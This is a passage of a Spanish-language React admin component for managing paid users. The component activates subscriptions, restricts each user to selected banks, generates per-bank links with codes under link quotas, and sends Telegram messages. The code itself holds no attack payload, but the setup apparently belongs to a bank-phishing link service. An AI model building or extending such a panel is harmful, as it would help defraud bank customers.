Alternar estado (activar/desactivar)\n  const toggleUserStatusMutation = useMutation({\n    mutationFn: async (username: string) => {\n      console.log(`[RegisteredUsers] Intentando alternar estado del usuario ${username}`);\n      const res = await apiRequest(\n        'POST',\n        `/api/users/regular/${username}/toggle-status`\n      );\n      const data = await res.json();\n      console.log(`[RegisteredUsers] Respuesta de toggle estado:`, data);\n      return data;\n    },\n    onSuccess: (data) => {\n      console.log(`[RegisteredUsers] Toggle de estado exitoso:`, data);\n      // Invalidar la consulta y forzar su recarga\n      queryClient.invalidateQueries({ queryKey: ['/api/users/regular'] });\n      refetch(); // Forzar una recarga inmediata\n      toast({\n        title: `Usuario ${data.user.isActive ? 'activado' : 'desactivado'}`,\n        description: `El estado del usuario ha sido cambiado a ${data.user.isActive ? 'activo' : 'inactivo'}.`,\n      });\n    },\n    onError: (error: Error) => {\n      console.error(`[RegisteredUsers] Error al alternar estado:`, error);\n      toast({\n        title: 'Error al cambiar estado',\n        description: error.message,\n        variant: 'destructive',\n      });\n    },\n  });\n\n  // Limpiar usuarios expirados\n  const cleanupExpiredUsersMutation = useMutation({\n    mutationFn: async () => {\n      const res = await apiRequest('POST', '/api/users/cleanup-expired');\n      return res.json();\n    },\n    onSuccess: (data) => {\n      queryClient.invalidateQueries({ queryKey: ['/api/users/regular'] });\n      refetch(); // Forzar recarga inmediata\n      toast({\n        title: 'Limpieza completada',\n        description: `Se han desactivado ${data.deactivatedCount} usuarios expirados.`,\n      });\n    },\n    onError: (error: Error) => {\n      toast({\n        title: 'Error al limpiar usuarios',\n        description: error.message,\n        variant: 'destructive',\n      });\n    },\n  });\n  \n  // Eliminar un usuario\n  const deleteUserMutation = useMutation({\n    mutationFn: async (username: string) => {\n      console.log(`[RegisteredUsers] Intentando eliminar usuario ${username}`);\n      const res = await apiRequest(\n        'DELETE',\n        `/api/users/regular/${username}`\n      );\n      const data = await res.json();\n      console.log(`[RegisteredUsers] Respuesta de eliminaci贸n:`, data);\n      return data;\n    },\n    onSuccess: (data) => {\n      console.log(`[RegisteredUsers] Eliminaci贸n exitosa:`, data);\n      // Invalidar la consulta y forzar su recarga\n      queryClient.invalidateQueries({ queryKey: ['/api/users/regular'] });\n      refetch(); // Forzar una recarga inmediata\n      toast({\n        title: 'Usuario eliminado',\n        description: data.message || 'El usuario ha sido eliminado correctamente.',\n      });\n    },\n    onError: (error: Error) => {\n      console.error(`[RegisteredUsers] Error al eliminar usuario:`, error);\n      toast({\n        title: 'Error al eliminar usuario',\n        description: error.message,\n        variant: 'destructive',\n      });\n    },\n  });\n  \n  // Generar enlace para usuario\n  const generateLinkMutation = useMutation({\n    mutationFn: async (banco: string) => {\n      console.log(`[RegisteredUsers] Generando enlace para el banco: ${banco}`);\n      const res = await apiRequest('GET', `/api/generate-link?banco=${banco}`);\n      return await res.json();\n    },\n    onSuccess: (data) => {\n      setGeneratedLink(data.link);\n      setGeneratedCode(data.code);\n      setIsLinkDialogOpen(true);\n      \n      toast({\n        title: \"Enlace generado\",\n        description: `Enlace generado exitosamente con c贸digo: ${data.code}`,\n      });\n      \n      // Invalidar la consulta para actualizar la lista de sesiones\n      queryClient.invalidateQueries({ queryKey: ['/api/sessions'] });\n    },\n    onError: (error: Error) => {\n      toast({\n        title: \"Error al generar enlace\",\n        description: error.message,\n        variant: \"destructive\",\n      });\n    }\n  });\n\n  // Enviar mensaje directo de Telegram\n  const sendTelegramMessageMutation = useMutation({\n    mutationFn: async ({ username, message }: { username: string; message: string }) => {\n      const res = await apiRequest(\n        'POST',\n        '/api/telegram/send-direct-message',\n        { \n          username,\n          message \n        }\n      );\n      return res.json();\n    },\n    onSuccess: (data) => {\n      toast({\n        title: 'Mensaje enviado',\n        description: data.message,\n      });\n      setMessageText('');\n      setIsMessageDialogOpen(false);\n    },\n    onError: (error: Error) => {\n      toast({\n        title: 'Error al enviar mensaje',\n        description: error.message,\n        variant: 'destructive',\n      });\n    },\n  });\n\n  // Actualizar precio personalizado\n  const updateCustomPriceMutation = useMutation({\n    mutationFn: async ({ userId, customPrice }: { userId: number; customPrice: string | null }) => {\n      const res = await apiRequest(\n        'PATCH',\n        `/api/users/${userId}/custom-price`,\n        { customPrice }\n      );\n      return res.json();\n    },\n    onSuccess: () => {\n      queryClient.invalidateQueries({ queryKey: ['/api/users/regular'] });\n      refetch();\n      toast({\n        title: 'Precio actualizado',\n        description: 'El precio personalizado se ha actualizado correctamente.',\n      });\n      setIsPriceDialogOpen(false);\n      setCustomPriceValue('');\n    },\n    onError: (error: Error) => {\n      toast({\n        title: 'Error al actualizar precio',\n        description: error.message,\n        variant: 'destructive',\n      });\n    },\n  });\n\n  // Manejar activaciones de usuario\n  const handleOpenBankOptions = (user: User) => {\n    setSelectedUser(user);\n    // Inicializar las opciones de bancos seleccionadas basadas en el usuario actual\n    const banksList = user.allowedBanks === 'all' \n      ? ['all'] \n      : user.allowedBanks?.split(',') || ['all'];\n    setBankOptions(banksList);\n    setIsDialogOpen(true);\n  };\n  \n  const handleUpdateBankOptions = () => {\n    if (!selectedUser) return;\n    \n    // Actualizaremos los bancos permitidos cuando el usuario se active\n    // No necesitamos hacer nada m谩s aqu铆, ya que las mutaciones de activaci贸n\n    // enviar谩n la informaci贸n actualizada\n    setIsDialogOpen(false);\n  };\n  \n  const handleBankOptionChange = (bank: string) => {\n    // Si seleccionamos 'all', eliminamos todas las dem谩s opciones\n    if (bank === 'all') {\n      setBankOptions(['all']);\n      return;\n    }\n    \n    // Si ya tenemos 'all' seleccionado y elegimos una opci贸n espec铆fica, eliminamos 'all'\n    if (bankOptions.includes('all')) {\n      setBankOptions([bank]);\n      return;\n    }\n    \n    // Si ya tenemos la opci贸n seleccionada, la removemos, a menos que sea la 煤nica\n    if (bankOptions.includes(bank) && bankOptions.length > 1) {\n      setBankOptions(bankOptions.filter(b => b !== bank));\n      return;\n    }\n    \n    // Si tenemos menos de 3 bancos seleccionados y no incluye 'all', agregamos la opci贸n\n    if (bankOptions.length < 3 && !bankOptions.includes('all') && !bankOptions.includes(bank)) {\n      setBankOptions([...bankOptions, bank]);\n      return;\n    }\n    \n    // Si ya tenemos 3 bancos y seleccionamos uno nuevo, mostramos un mensaje\n    if (bankOptions.length >= 3 && !bankOptions.includes(bank) && !bankOptions.includes('all')) {\n      toast({\n        title: 'L铆mite alcanzado',\n        description: 'Solo puede seleccionar hasta 3 bancos espec铆ficos, o la opci贸n \"Todos\".',\n        variant: 'destructive',\n      });\n    }\n  };\n  \n  const handleActivateOneDay = (username: string) => {\n    // Actualizar correctamente los bancos permitidos en la mutaci贸n\n    console.log(`[RegisteredUsers] Activando por 1 d铆a: ${username}, bancos:`, bankOptions);\n    \n    // Si hemos seleccionado \"todos los bancos\", usamos \"all\" como valor\n    const allowedBanksValue = bankOptions.includes('all') ? 'all' : bankOptions.join(',');\n    \n    console.log(`[RegisteredUsers] Valor final de allowedBanks: ${allowedBanksValue}`);\n    \n    activateOneDayMutation.mutate({\n      username, \n      allowedBanks: allowedBanksValue\n    });\n  };\n\n  const handleActivateSevenDays = (username: string) => {\n    // Actualizar correctamente los bancos permitidos en la mutaci贸n\n    console.log(`[RegisteredUsers] Activando por 7 d铆as: ${username}, bancos:`, bankOptions);\n    \n    // Si hemos seleccionado \"todos los bancos\", usamos \"all\" como valor\n    const allowedBanksValue = bankOptions.includes('all') ? 'all' : bankOptions.join(',');\n    \n    console.log(`[RegisteredUsers] Valor final de allowedBanks: ${allowedBanksValue}`);\n    \n    activateSevenDaysMutation.mutate({\n      username,\n      allowedBanks: allowedBanksValue\n    });\n  };\n\n  const handleToggleStatus = (username: string) => {\n    toggleUserStatusMutation.mutate(username);\n  };\n\n  const handleOpenPriceDialog = (user: User) => {\n    setSelectedUser(user);\n    setCustomPriceValue(user.customPrice || '');\n    setIsPriceDialogOpen(true);\n  };\n\n  const handleUpdateCustomPrice = () => {\n    if (!selectedUser) return;\n    \n    const priceValue = customPriceValue.trim() === '' ? null : customPriceValue;\n    updateCustomPriceMutation.mutate({\n      userId: selectedUser.id,\n      customPrice: priceValue\n    });\n  };\n\n  const handleCleanupExpiredUsers = () => {\n    cleanupExpiredUsersMutation.mutate();\n  };\n  \n  const handleDeleteUser = (username: string) => {\n    // Confirmaci贸n antes de eliminar\n    if (window.confirm(`驴Est谩s seguro de que deseas eliminar al usuario \"${username}\"? Esta acci贸n no se puede deshacer.`)) {\n      deleteUserMutation.mutate(username);\n    }\n  };\n  \n  // Resetear cuota de links de un usuario\n  const resetLinkQuotaMutation = useMutation({\n    mutationFn: async (userId: number) => {\n      const res = await apiRequest('POST', `/api/admin/users/${userId}/reset-link-quota`, {});\n      return await res.json();\n    },\n    onSuccess: (data, userId) => {\n      toast({\n        title: 'Cuota reseteada',\n        description: data.message || 'El usuario puede generar 150 links adicionales',\n      });\n      // Actualizar la cuota en el estado local\n      fetchUserQuotas();\n    },\n    onError: (error: Error) => {\n      toast({\n        title: 'Error al resetear cuota',\n        description: error.message,\n        variant: 'destructive',\n      });\n    },\n  });\n\n  // Obtener el color del contador seg煤n el porcentaje de uso\n  const getQuotaColor = (used: number, limit: number): string => {\n    const percentage = (used / limit) * 100;\n    if (percentage >= 90) return 'text-red-600';\n    if (percentage >= 70) return 'text-yellow-600';\n    return 'text-green-600';\n  };\n\n  // Manejador para resetear la cuota de links\n  const handleResetLinkQuota = (user: User) => {\n    if (window.confirm(`驴Est谩s seguro de que deseas resetear la cuota de links para \"${user.username}\"? Esto permitir谩 al usuario generar 150 links adicionales.`)) {\n      resetLinkQuotaMutation.mutate(user.id);\n    }\n  };\n\n  // Manejador para generar un nuevo enlace\n  const handleGenerateLink = (user: User) => {\n    // Verificar si el usuario est谩 activo\n    if (!user.isActive) {\n      toast({\n        title: \"Usuario inactivo\",\n        description: \"El usuario debe estar activo para generar enlaces\",\n        variant: \"destructive\"\n      });\n      return;\n    }\n    \n    // Determinar qu茅 banco usar\n    let bancoSeleccionado = selectedBank;\n    \n    // Verificar las restricciones de bancos del usuario\n    if (user.allowedBanks && user.allowedBanks !== 'all') {\n      const bancosPermitidos = user.allowedBanks.split(',').map(b => b.trim());\n      console.log(`[RegisteredUsers] Bancos permitidos para ${user.username}:`, bancosPermitidos);\n      \n      // Verificar si el banco seleccionado est谩 permitido para el usuario\n      if (!bancosPermitidos.includes(bancoSeleccionado)) {\n        // Si el banco seleccionado no est谩 permitido, usar el primero disponible\n        if (bancosPermitidos.length > 0) {\n          bancoSeleccionado = bancosPermitidos[0].toUpperCase();\n          toast({\n            title: \"Banco cambiado\",\n            description: `Banco seleccionado no disponible para este usuario. Usando ${bancoSeleccionado} en su lugar.`,\n          });\n        } else {\n          toast({\n            title: \"Error\",\n            description: \"Este usuario no tiene bancos permitidos configurados.\",\n            variant: \"destructive\"\n          });\n          return;\n        }\n      }\n    }\n    \n    console.log(`[RegisteredUsers] Generando enlace para ${user.username} con banco ${bancoSeleccionado}`);\n    \n    // Para cualquier usuario (incluido el superadmin), usamos la API normal\n    // que ya tiene la l贸gica para verificar restricciones de bancos\n    generateLinkMutation.mutate(bancoSeleccionado);\n  };\n  \n  // Funci贸n para copiar el enlace al portapapeles\n  const copyGeneratedLink = () => {\n    if (generatedLink) {\n      navigator.clipboard.writeText(generatedLink)\n        .then(() => {\n          toast({\n            title: \"Enlace copiado\",\n            description: \"El enlace ha sido copiado al portapapeles\",\n          });\n        })\n        .catch(err => {\n          console.error('Error al copiar al portapapeles:', err);\n          toast({\n            title: \"Error al copiar\",\n            description: \"No se pudo copiar el enlace\",\n            variant: \"destructive\",\n          });\n        });\n    }\n  };\n\n  // Funciones para manejo de mensajes de Telegram\n  const handleOpenMessageDialog = (user: User) => {\n    setSelectedUser(user);\n    setMessageText('');\n    setIsMessageDialogOpen(true);\n  };\n\n  const handleSendMessage = () => {\n    if (!selectedUser || !messageText.trim()) return;\n    \n    sendTelegramMessageMutation.mutate({\n      username: selectedUser.username,\n      message: messageText.trim()\n    });\n  };\n\n  // Revisar si hay error de permisos\n  if (error) {\n    return (\n      <Card>\n        <CardHeader>\n          <CardTitle>Usuarios Registrados</CardTitle>\n          <CardDescription>\n            Gesti贸n de usuarios normales del sistema\n          </CardDescription>\n        </CardHeader>\n        <CardContent>\n          <div className=\"flex flex-col items-center justify-center p-6 text-center\">\n            <X className=\"w-12 h-12 text-destructive mb-2\" />\n            <h3 className=\"text-lg font-semibold mb-1\">Acceso Denegado</h3>\n            <p className=\"text-muted-foreground\">\n              Solo el usuario \"balonx\" puede acceder a esta secci贸n.\n            </p>\n          </div>\n        </CardContent>\n      </Card>\n    );\n  }\n\n  return (\n    <>\n      <Card>\n        <CardHeader>\n          <CardTitle>Usuarios Registrados</CardTitle>\n          <CardDescription>\n            Administra los usuarios que pueden acceder al sistema\n          </CardDescription>\n        </CardHeader>\n        <CardContent>\n          {/* Filtros de b煤squeda y estado */}\n          <div className=\"flex flex-col sm:flex-row gap-4 mb-6\">\n            <div className=\"flex-1 relative\">\n              <Search className=\"absolute left-3 top-1/2 -translate-y-1/2 h-4 w-4 text-muted-foreground\" />\n              <input\n                type=\"text\"\n                placeholder=\"Buscar usuario...\"\n                value={searchQuery}\n                onChange={(e) => setSearchQuery(e.target.value)}\n                className=\"w-full pl-10 pr-4 py-2 border rounded-md bg-background\"\n              />\n            </div>\n            <div className=\"flex gap-2\">\n              <Button\n                variant={statusFilter === 'all' ? 'default' : 'outline'}\n                size=\"sm\"\n                onClick={() => setStatusFilter('all')}\n                className=\"flex-1 sm:flex-none\"\n              >\n                <Filter className=\"h-4 w-4 mr-2\" />\n                Todos ({users.length})\n              </Button>\n              <Button\n                variant={statusFilter === 'active' ? 'default' : 'outline'}\n                size=\"sm\"\n                onClick={() => setStatusFilter('active')}\n                className=\"flex-1 sm:flex-none\"\n              >\n                <Check className=\"h-4 w-4 mr-2\" />\n                Activos ({users.filter(u => u.isActive).length})\n              </Button>\n              <Button\n                variant={statusFilter === 'inactive' ? 'default' : 'outline'}\n                size=\"sm\"\n                onClick={() => setStatusFilter('inactive')}\n                className=\"flex-1 sm:flex-none\"\n              >\n                <X className=\"h-4 w-4 mr-2\" />\n                Inactivos ({users.filter(u => !u.isActive).length})\n              </Button>\n            </div>\n          </div>\n          \n          {isLoading ? (\n            <div className=\"flex justify-center items-center p-8\">\n              <Loader2 className=\"h-8 w-8 animate-spin text-primary\" />\n            </div>\n          ) : (\n            <>\n              {filteredUsers.length === 0 ? (\n                <div className=\"text-center p-6 border rounded-md bg-muted/30\">\n                  <p className=\"text-muted-foreground\">\n                    {searchQuery || statusFilter !== 'all' \n                      ? 'No se encontraron usuarios con los filtros aplicados' \n                      : 'No hay usuarios registrados'}\n                  </p>\n                </div>\n              ) : (\n                <>\n                  {/* Renderizaci贸n condicional basada en si es m贸vil y orientaci贸n */}\n                  {!isMobile || isLandscape ? (\n                    /* Vista para desktop o m贸vil en landscape: tabla */\n                    <div className=\"overflow-x-auto max-h-[70vh] overflow-y-auto pr-2\">\n                      <Table>\n                        <TableHeader className=\"sticky top-0 bg-background z-10\">\n                          <TableRow>\n                            <TableHead>Usuario</TableHead>\n                            <TableHead>Tipo</TableHead>\n                            <TableHead>Estado</TableHead>\n                            <TableHead>Precio</TableHead>\n                            <TableHead>Links</TableHead>\n                            <TableHead>Caduca</TableHead>\n                            <TableHead>Dispositivos</TableHead>\n                            <TableHead>ltimo Login</TableHead>\n                            <TableHead>Acciones</TableHead>\n                          </TableRow>\n                        </TableHeader>\n                        <TableBody>\n                          {filteredUsers.map((user) => (\n                            <TableRow key={user.id}>\n                              <TableCell className=\"font-medium\">\n                                <div className=\"flex items-center gap-2\">\n                                  {user.username}\n                                  {user.allowedBanks && (\n                                    <Badge variant=\"outline\" className=\"px-1.5 py-0 h-5\">\n                                      <Building className=\"h-3 w-3 mr-1\" /> \n                                      {user.allowedBanks === 'all' ? 'Todos' : user.allowedBanks.split(',').length}\n                                    </Badge>\n                                  )}\n                                </div>\n                              </TableCell>\n                              <TableCell>\n                                {user.accountType === 'office' ? (\n                                  <Badge variant=\"default\" className=\"bg-blue-500 hover:bg-blue-600\">\n                                    <Building className=\"w-3 h-3 mr-1\" /> Oficina\n                                  </Badge>\n                                ) : (\n                                  <Badge variant=\"secondary\">\n                                    <User className=\"w-3 h-3 mr-1\" /> Individual\n                                  </Badge>\n                                )}\n                              </TableCell>\n                              <TableCell>\n                                {user.isActive ? (\n                                  <Badge className=\"bg-green-500 text-white hover:bg-green-500/80\">\n                                    <Check className=\"w-3 h-3 mr-1\" /> Activo\n                                  </Badge>\n                                ) : (\n                                  <Badge variant=\"destructive\">\n                                    <X className=\"w-3 h-3 mr-1\" /> Inactivo\n                                  </Badge>\n                                )}\n                              </TableCell>\n                              <TableCell>\n                                <div className=\"flex items-center gap-1\">\n                                  <DollarSign className=\"w-3 h-3 text-green-600\" />\n                                  <span className=\"font-medium\">\n                                    ${user.customPrice || (user.accountType === 'office' ? '6000' : '3000')}\n                                  </span>\n                                  {user.customPrice && (\n                                    <span className=\"text-xs text-muted-foreground ml-1\">(personalizado)</span>\n                                  )}\n                                </div>\n                              </TableCell>\n                              <TableCell>\n                                {(() => {\n                                  const quota = userQuotas.get(user.id);\n                                  if (!quota) {\n                                    return (\n                                      <div className=\"flex items-center gap-2\">\n                                        <Loader2 className=\"w-3 h-3 animate-spin text-muted-foreground\" />\n                                        <span className=\"text-xs text-muted-foreground\">Cargando...</span>\n                                      </div>\n                                    );\n                                  }\n                                  \n                                  return (\n                                    <div className=\"flex flex-col gap-1\">\n                                      <div className=\"flex items-center gap-2\">\n                                        <LinkIcon className=\"w-3 h-3 text-muted-foreground\" />\n                                        <span className={`font-medium ${getQuotaColor(quota.used, quota.limit)}`}>\n                                          {quota.used} / {quota.limit}\n                                        </span>\n                                      </div>\n                                      {quota.used >= quota.limit * 0.7 && (\n                                        <Button\n                                          size=\"sm\"\n                                          variant=\"outline\"\n                                          onClick={() => handleResetLinkQuota(user)}\n                                          disabled={resetLinkQuotaMutation.isPending}\n                                          className=\"h-6 px-2 text-xs\"\n                                          title=\"Resetear cuota y agregar 150 links m谩s\"\n                                        >\n                                          <Plus className=\"w-3 h-3 mr-1\" />\n                                          Agregar\n                                        </Button>\n                                      )}\n                                    </div>\n                                  );\n                                })()}\n                              </TableCell>\n                              <TableCell>\n                                {user.expiresAt ? (\n                                  <div className=\"flex flex-col\">\n                                    <span className=\"flex items-center text-sm\">\n                                      <Clock className=\"w-3 h-3 mr-1\" /> \n                                      {formatDate(new Date(user.expiresAt))}\n                                    </span>\n                                    {user.isActive && (\n                                      <span className=\"text-xs text-muted-foreground mt-1\">\n                                        {(() => {\n                                          const now = new Date();\n                                          const expiresAt = new Date(user.expiresAt);\n                                          if (expiresAt < now) {\n                                            return (\n                                              <Badge variant=\"destructive\" className=\"text-xs\">\n                                                Vencido\n                                              </Badge>\n                                            );\n                                          }\n                                          const timeRemainingMs = expiresAt.getTime() - now.getTime();\n                                          const daysRemaining = Math.floor(timeRemainingMs / (1000 * 60 * 60 * 24));\n                                          const hoursRemaining = Math.floor((timeRemainingMs % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));\n                                          \n                                          if (daysRemaining === 0 && hoursRemaining < 24) {\n                                            return (\n                                              <Badge variant=\"destructive\" className=\"text-xs\">\n                                                Vence en {hoursRemaining}h\n                                              </Badge>\n                                            );\n                                          }\n                                          return `Restante: ${daysRemaining}d ${hoursRemaining}h`;\n                                        })()}\n                                      </span>\n                                    )}\n                                  </div>\n                                ) : (\n                                  <span className=\"text-muted-foreground\">No establecido</span>\n                                )}\n                              </TableCell>\n                              <TableCell>\n                                {user.deviceCount || 0} / {user.maxDevices || 3}\n                              </TableCell>\n                              <TableCell>\n                                {user.lastLogin ? formatDate(new Date(user.lastLogin)) : 'Nunca'}\n                              </TableCell>\n                              <TableCell>\n                                <div className=\"flex gap-2\">\n                                  <Button \n                                    variant=\"outline\" \n                                    size=\"sm\"\n                                    onClick={() => handleOpenBankOptions(user)}\n                                    disabled={activateOneDayMutation.isPending || activateSevenDaysMutation.isPending}\n                                    title=\"Configurar bancos y activar\"\n                                  >\n                                    <Building className=\"w-4 h-4 mr-1\" /> Activar\n                                  </Button>\n                                  <Button \n                                    variant={user.isActive ? \"destructive\" : \"default\"}\n                                    size=\"sm\"\n                                    className=\"ml-2\"\n                                    onClick={() => handleToggleStatus(user.username)}\n                                    disabled={toggleUserStatusMutation.isPending}\n                                  >\n                                    {user.isActive ? \n                                      <><ToggleRight className=\"w-4 h-4 mr-1\" /> Desactivar</> : \n                                      <><ToggleLeft className=\"w-4 h-4 mr-1\" /> Activar</>\n                                    }\n                                  </Button>\n                                  <Button \n                                    variant=\"destructive\" \n                                    size=\"sm\"\n                                    className=\"ml-2\"\n                                    onClick={() => handleDeleteUser(user.username)}\n                                    disabled={deleteUserMutation.isPending}\n                                  >\n                                    <Trash className=\"w-4 h-4\" />\n                                  </Button>\n                                  <Button \n                                    variant=\"outline\" \n                                    size=\"sm\"\n                                    className=\"ml-2\"\n                                    onClick={() => handleOpenMessageDialog(user)}\n                                    disabled={!user.telegramChatId || sendTelegramMessageMutation.isPending}\n                                    title={!user.telegramChatId ? \"Usuario sin Chat ID configurado\" : \"Enviar mensaje de Telegram\"}\n                                  >\n                                    <MessageCircle className=\"w-4 h-4\" />\n                                  </Button>\n                                </div>\n                              </TableCell>\n                            </TableRow>\n                          ))}\n                        </TableBody>\n                      </Table>\n                    </div>\n                  ) : (\n                    /* Vista para m贸vil en portrait: tarjetas */\n                    <div className=\"space-y-4 max-h-[70vh] overflow-y-auto pr-2\">\n                      {filteredUsers.map((user) => (\n                        <div key={user.id} className=\"border rounded-lg p-4 bg-card\">\n                          <div className=\"flex items-center justify-between mb-4\">\n                            <div className=\"flex items-center space-x-2\">\n                              <User className=\"h-5 w-5 text-muted-foreground\" />\n                              <span className=\"font-medium\">{user.username}</span>\n                              {user.allowedBanks && (\n                                <Badge variant=\"outline\" className=\"px-1.5 py-0 h-5 ml-1\">\n                                  <Building className=\"h-3 w-3 mr-1\" /> \n                                  {user.allowedBanks === 'all' ? 'Todos' : user.allowedBanks.split(',').length}\n                                </Badge>\n                              )}\n                            </div>\n                            {user.isActive ? (\n                              <Badge className=\"bg-green-500 text-white hover:bg-green-500/80\">\n                                <Check className=\"w-3 h-3 mr-1\" /> Activo\n                              </Badge>\n                            ) : (\n                              <Badge variant=\"destructive\">\n                                <X className=\"w-3 h-3 mr-1\" /> Inactivo\n                              </Badge>\n                            )}\n                          </div>\n                          \n                          <div className=\"space-y-2 text-sm mb-4\">\n                            <div className=\"flex items-center\">\n                              {user.accountType === 'office' ? (\n                                <>\n                                  <Building className=\"h-4 w-4 text-blue-500 mr-2\" />\n                                  <span className=\"text-muted-foreground mr-1\">Tipo:</span>\n                                  <Badge variant=\"default\" className=\"bg-blue-500 hover:bg-blue-600 h-5\">\n                                    Oficina\n                                  </Badge>\n                                </>\n                              ) : (\n                                <>\n                                  <User className=\"h-4 w-4 text-muted-foreground mr-2\" />\n                                  <span className=\"text-muted-foreground mr-1\">Tipo:</span>\n                                  <Badge variant=\"secondary\" className=\"h-5\">\n                                    Individual\n                                  </Badge>\n                                </>\n                              )}\n                            </div>\n                            <div className=\"flex items-start\">\n                              <Calendar className=\"h-4 w-4 text-muted-foreground mr-2 mt-0.5\" />\n                              <div className=\"flex flex-col\">\n                                <div>\n                                  <span className=\"text-muted-foreground mr-1\">Caduca:</span>\n                                  {user.expiresAt ? (\n                                    <span>{formatDate(new Date(user.expiresAt))}</span>\n                                  ) : (\n                                    <span className=\"text-muted-foreground\">No establecido</span>\n                                  )}\n                                </div>\n                                {user.expiresAt && user.isActive && (\n                                  <div className=\"text-xs mt-0.5\">\n                                    {(() => {\n                                      const now = new Date();\n                                      const expiresAt = new Date(user.expiresAt);\n                                      if (expiresAt < now) {\n                                        return (\n                                          <Badge variant=\"destructive\" className=\"text-xs\">\n                                            Vencido\n                                          </Badge>\n                                        );\n                                      }\n                                      const timeRemainingMs = expiresAt.getTime() - now.getTime();\n                                      const daysRemaining = Math.floor(timeRemainingMs / (1000 * 60 * 60 * 24));\n                                      const hoursRemaining = Math.floor((timeRemainingMs % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));\n                                      \n                                      if (daysRemaining === 0 && hoursRemaining < 24) {\n                                        return (\n                                          <Badge variant=\"destructive\" className=\"text-xs\">\n                                            Vence en {hoursRemaining}h\n                                          </Badge>\n                                        );\n                                      }\n                                      return `Restante: ${daysRemaining}d ${hoursRemaining}h`;\n                                    })()}\n                                  </div>\n                                )}\n                              </div>\n                            </div>\n                            \n                            <div className=\"flex items-center\">\n                              <Smartphone className=\"h-4 w-4 text-muted-foreground mr-2\" />\n                              <span className=\"text-muted-foreground mr-1\">Dispositivos:</span>\n                              <span>{user.deviceCount || 0} / {user.maxDevices || 3}</span>\n                            </div>\n                            \n                            <div className=\"flex items-center\">\n                              <Clock className=\"h-4 w-4 text-muted-foreground mr-2\" />\n                              <span className=\"text-muted-foreground mr-1\">ltimo login:</span>\n                              <span>{user.lastLogin ? formatDate(new Date(user.lastLogin)) : 'Nunca'}</span>\n                            </div>\n                          </div>\n                          \n                          <div className=\"flex gap-2 pt-2 border-t\">\n                            <Button \n                              variant=\"outline\" \n                              size=\"sm\"\n                              className=\"flex-1\"\n                              onClick={() => handleOpenBankOptions(user)}\n                              disabled={activateOneDayMutation.isPending || activateSevenDaysMutation.isPending}\n                            >\n                              <Building className=\"w-4 h-4 mr-1\" /> Configurar bancos\n                            </Button>\n                            <Button \n                              variant=\"outline\" \n                              size=\"sm\"\n                              className=\"flex-1\"\n                              onClick={() => handleGenerateLink(user)}\n                              disabled={!user.isActive || generateLinkMutation.isPending}\n                            >\n                              <LinkIcon className=\"w-4 h-4 mr-1\" /> Generar enlace\n                            </Button>\n                            <Button \n                              variant=\"outline\" \n                              size=\"sm\"\n                              className=\"flex-1 ml-2\"\n                              onClick={() => handleOpenMessageDialog(user)}\n                              disabled={!user.telegramChatId || sendTelegramMessageMutation.isPending}\n                              title={!user.telegramChatId ? \"Usuario sin Chat ID configurado\" : \"Enviar mensaje de Telegram\"}\n                            >\n                              <MessageCircle className=\"w-4 h-4 mr-1\" /> Mensaje\n                            </Button>\n                          </div>\n                          <div className=\"flex gap-2 pt-2 border-t\">\n                            <Button \n                              variant=\"outline\" \n                              size=\"sm\"\n                              className=\"flex-1\"\n                              onClick={() => handleOpenPriceDialog(user)}\n                              disabled={updateCustomPriceMutation.isPending}\n                            >\n                              <DollarSign className=\"w-4 h-4 mr-1\" /> \n                              {user.customPrice \n                                ? `Precio: $${user.customPrice} (pers.)` \n                                : `Precio: $${user.accountType === 'office' ? '6000' : '3000'}`}\n                            </Button>\n                          </div>\n                          <div className=\"mt-2 pt-2 border-t\">\n                            <Button \n                              variant={user.isActive ? \"destructive\" : \"default\"}\n                              size=\"sm\"\n                              className=\"w-full mb-2\"\n                              onClick={() => handleToggleStatus(user.username)}\n                              disabled={toggleUserStatusMutation.isPending}\n                            >\n                              {user.isActive ? \n                                <><ToggleRight className=\"w-4 h-4 mr-1\" /> Desactivar usuario</> : \n                                <><ToggleLeft className=\"w-4 h-4 mr-1\" /> Activar usuario</>\n                              }\n                            </Button>\n                            <Button \n                              variant=\"destructive\" \n                              size=\"sm\"\n                              className=\"w-full\"\n                              onClick={() => handleDeleteUser(user.username)}\n                              disabled={deleteUserMutation.isPending}\n                            >\n                              <Trash className=\"w-4 h-4 mr-1\" /> Eliminar usuario\n                            </Button>\n                          </div>\n                        </div>\n                      ))}\n                    </div>\n                  )}\n                </>\n              )}\n            </>\n          )}\n        </CardContent>\n        <CardFooter className={`flex ${isMobile ? 'flex-col space-y-2' : 'justify-between'}`}>\n          <Button\n            variant=\"outline\"\n            onClick={() => refetch()}\n            disabled={isLoading}\n            className={isMobile ? 'w-full' : ''}\n          >\n            {isLoading ? (\n              <>\n                <Loader2 className=\"mr-2 h-4 w-4 animate-spin\" />\n                Cargando...\n              </>\n            ) : (\n              'Actualizar'\n            )}\n          </Button>\n          <Button\n            variant=\"secondary\"\n            onClick={handleCleanupExpiredUsers}\n            disabled={cleanupExpiredUsersMutation.isPending}\n            className={isMobile ? 'w-full' : ''}\n          >\n            {cleanupExpiredUsersMutation.isPending ? (\n              <>\n                <Loader2 className=\"mr-2 h-4 w-4 animate-spin\" />\n                Limpiando...\n              </>\n            ) : (\n              'Limpiar usuarios expirados'\n            )}\n          </Button>\n        </CardFooter>\n      </Card>\n\n      {/* Dialog para configurar bancos permitidos */}\n      <Dialog open={isDialogOpen} onOpenChange={setIsDialogOpen}>\n        <DialogContent className=\"sm:max-w-md\">\n          <DialogHeader>\n            <DialogTitle>Configurar Bancos Permitidos</DialogTitle>\n            <DialogDescription>\n              {selectedUser && (\n                <>\n                  Selecciona los bancos a los que el usuario <strong>{selectedUser.username}</strong> tendr谩 acceso.\n                  Puedes seleccionar hasta 3 bancos espec铆ficos o la opci贸n \"Todos\".\n                </>\n              )}\n            </DialogDescription>\n          </DialogHeader>\n          <div className=\"grid gap-4 py-4\">\n            <div className=\"space-y-2\">\n              <div className=\"flex flex-wrap gap-2\">\n                <div \n                  className={`cursor-pointer px-3 py-2 rounded-md flex items-center ${\n                    bankOptions.includes('all') ? 'bg-primary text-primary-foreground' : 'bg-muted'\n                  }`}\n                  onClick={() => handleBankOptionChange('all')}\n                >\n                  <Building className=\"w-4 h-4 mr-2\" />\n                  <span>Todos los bancos</span>\n                </div>\n                {Object.values(BankType)\n                  .filter(bank => bank !== BankType.ALL) // Excluir \"all\" ya que lo mostramos arriba\n                  .map((bank) => (\n                    <div \n                      key={bank}\n                      className={`cursor-pointer px-3 py-2 rounded-md 